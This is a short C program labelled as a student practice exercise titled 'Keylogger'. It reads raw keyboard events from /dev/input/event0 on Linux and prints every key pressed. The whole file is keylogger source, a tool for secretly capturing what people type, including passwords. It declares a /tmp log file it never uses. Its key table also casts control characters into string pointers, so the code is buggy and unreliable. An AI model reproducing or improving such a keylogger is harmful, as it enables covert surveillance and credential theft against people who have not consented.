/*
	Practica 14: Keylogger
	Autor: Espinosa Curiel Oscar
*/
#include <stdio.h>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#define esc 27
#define  bs  8
#define tab 9
#define enter 13
#define space 32
char *arreglo[] = {" "," ","1","2","3","4","5","6","7","8","9","0",
					"-","=",(char)bs,(char)tab,"q","w","e","r","t",
					"y","u","i","o","p", "LEFTBRACE", "RIGHTBRACE",
    				(char) enter,"LEFTCTRL","A","S","D","F","G","H","J","K",
    				"L","-","'","GRAVE","LEFTSHIFT","\\","Z","X","C",
    				"V","B","N","M",",",".","/","RIGHTSHIFT",
    				"KPASTERISK","LEFTALT"," ","CAPSLOCK","F1","F2",
    				"F3","F4","F5","F6","F7","F8","F9","F10"};
int main(){
	struct input_event ev;
	char *event = "/dev/input/event0";
	char *archivo = "/tmp/keylogger";
	int fda = open(event, O_RDONLY,S_IRUSR|S_IWUSR);
	while(1){
		read(fda, &ev, sizeof(struct input_event));

    	if (ev.type == 1 && ev.value == 1){
    		printf("%s\n", arreglo[ev.code]);
    	}
	}
	close(fda);

	return 0;
}
